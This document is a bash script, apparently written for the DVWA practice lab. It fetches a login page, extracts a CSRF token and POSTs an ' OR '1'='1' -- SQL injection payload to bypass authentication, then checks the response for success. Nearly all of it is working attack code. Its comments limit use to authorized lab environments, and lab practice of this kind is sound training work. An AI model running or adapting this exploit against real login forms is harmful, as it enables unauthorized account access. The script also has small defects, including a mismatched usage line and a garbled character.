set -euo pipefail
TARGET=${1:-}
if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <127.0.0.1>"
  echo "Example: $0 http://localhost/dvwa/"
  exit 1
fi

# normalize trailing slash
TARGET=${TARGET%/}/
LOGIN_PAGE_URL="${TARGET}login.php"
LOGIN_POST_URL="${TARGET}login.php"

echo "[+] Target: $TARGET"

# 1) Check availability
if ! curl -sSf --head "$TARGET" >/dev/null; then
  echo "[-] Target not reachable. Make sure DVWA is running and accessible at $TARGET"
  exit 2
fi

echo "[+] Target reachable â€” fetching login page to look for a CSRF token (if any)"
PAGE_HTML=$(curl -s "$LOGIN_PAGE_URL")

# 2) Try to extract a token named user_token or csrf_token or similar (DVWA uses user_token)
USER_TOKEN=""
if echo "$PAGE_HTML" | grep -q "name=\"user_token\""; then
  USER_TOKEN=$(echo "$PAGE_HTML" | grep -oP 'name="user_token"\s+value="\K[^"]+' || true)
  echo "[+] Found user_token: ${USER_TOKEN}"
else
  echo "[i] No user_token input detected (or couldn't parse). Continuing without token."
fi

# 3) Prepare SQLi payloads (used only for lab/demo environments)
# NOTE: These are classical, trivial payloads for demonstration and are NOT targeted at any real site.
SQLI_USERNAME="' OR '1'='1' -- "
SQLI_PASSWORD="irrelevant"

# 4) Perform POST to attempt login bypass
# Build POST data: user, password, Login (DVWA uses username/password fields 'username' and 'password')
# If token is present include it.
POST_DATA="username=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote('''$SQLI_USERNAME'''))")&password=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote('''$SQLI_PASSWORD'''))")&Login=Login"
if [[ -n "$USER_TOKEN" ]]; then
  POST_DATA="${POST_DATA}&user_token=${USER_TOKEN}"
fi

echo "[+] Sending exploit POST (this demonstrates a login-bypass SQLi attempt against a DVWA-style form)"

# send request and capture response headers + body
RESP_HEADERS=$(mktemp)
RESP_BODY=$(mktemp)

curl -s -D "$RESP_HEADERS" -o "$RESP_BODY" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "$POST_DATA" \
  "$LOGIN_POST_URL"

# 5) Simple heuristics to tell if login succeeded (DVWA shows a logout or profile link on success)
if grep -qi "logout" "$RESP_BODY" || grep -qi "welcome" "$RESP_BODY" || grep -qi "You have logged in" "$RESP_BODY"; then
  echo "[+] Response suggests login bypass may have succeeded. Check interactive session in browser."
else
  echo "[-] Response does not show obvious login success indicators. Check page saved to: $RESP_BODY"
fi

# Print small excerpt of response body for manual inspection (safe size)
echo "\n--- Response body snippet (first 1000 chars) ---"
head -c 1000 "$RESP_BODY" | sed -n '1,200p'

echo "\nHeaders saved to: $RESP_HEADERS"

echo "\n[!] Done. Remember: run this only in authorized lab environments (DVWA / intentionally vulnerable VMs)."


